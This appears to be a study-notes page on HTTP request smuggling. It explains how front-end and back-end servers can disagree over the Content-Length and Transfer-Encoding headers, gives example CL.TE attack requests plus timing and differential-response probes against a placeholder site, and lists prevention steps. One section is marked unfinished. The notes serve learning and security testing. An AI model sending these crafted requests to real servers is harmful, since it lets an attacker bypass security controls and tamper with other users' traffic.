# HTTP Request Smuggling

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. They might allow to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request.

## How do HTTP request smuggling vulnerabilities arise?

HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.

{% code overflow="wrap" fullWidth="true" %}
```sh
# The Content-Length header is straightforward: it specifies the length of the message body in bytes.
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

# The Transfer-Encoding header can be used to specify that the message body uses chunked encoding.
# NOTE: Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses. 
This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size 
in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. 
The message is terminated with a chunk of size zero. For example: 
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

# Conflict comes when sending both headers at once. Specification says Content-Length should be ignored.
# That is OK with a single server, but with 2+ are chained together: 
 - Some servers do not support the Transfer-Encoding header in requests.
 - Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
```
{% endcode %}

## How to perform an HTTP request smuggling attack

{% code overflow="wrap" fullWidth="true" %}
```sh
# Placing both Content-Length and Transfer-Encoding headers into a single HTTP/1 request and manipulating these
# so that the front-end and back-end servers process the request differently
# The exact way in which this is done depends on the behavior of the two servers: 
    CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
    TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
    TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers 
    can be induced not to process it by obfuscating the header in some way.
# NOTE: These techniques are only possible using HTTP/1 requests. Change HTTP/2 to HTTP/1 on Burp > Request attributes


### CL.TE vulnerabilities
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
### Front-end server processes Content-Length header (body 13 bytes long), up to the end of SMUGGLED. 
# This request is forwarded on to the back-end server. 
### The back-end server processes Transfer-Encoding header, and so treats the message body as using chunked encoding. 
# It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. 
# The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat as start of the next request in the sequence. 
# Example to perform request on the back-end server using GPOST method:
POST / HTTP/1.1

...

Content-Length: 35

Transfer-Encoding: chunked



5

GPOST

0



GPOST / HTTP/1.1

# TO BE CONTINUED... TO DO: incomplete, add more techniques from PortSwigger
```
{% endcode %}

## Finding HTTP request smuggling vulnerabilities

{% code overflow="wrap" fullWidth="true" %}
```sh
########### USING TIMING TECHNIQUES
send requests that will cause a time delay in the application responses if a vulnerability is present. 
# Finding CL.TE vulnerabilities using timing techniques
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
# If vulnerable, sending a request like the above will often cause a time delay
# Front-end processes Content-Length so does not include X. Back-end -> Transfer-Encoding so X is a new request for it.
# Back-end server processes first chunk, then waits for new chunk to arrive. That introduces an observable time delay.

########### USING DIFFERENTIAL RESPONSES
# This involves sending 2 requests in quick succession:
    An "attack" request that is designed to interfere with the processing of the next request.
    A "normal" request.
If the response to the normal request contains the expected interference, then the vulnerability is confirmed.
# For example, suppose the normal request looks like this:
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

This request normally receives an HTTP response with status code 200, containing some search results.
The attack request that is needed to interfere with this request depends on the variant of request smuggling that is present: CL.TE vs TE.CL. 
# Confirming CL.TE vulnerabilities using differential responses
# To confirm a CL.TE vulnerability, you would send an attack request like this:
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
# If the attack is successful, then the last two lines of this request are treated by the back-end server 
# as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

Since this request now contains an invalid URL, the server will respond with status code 404, 
indicating that the attack request did indeed interfere with it. 
```
{% endcode %}

## How to prevent HTTP request smuggling vulnerabilities

* Use HTTP/2 end to end and disable HTTP downgrading if possible.
* Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP connection in the process.
* Never assume that requests won't have a body.
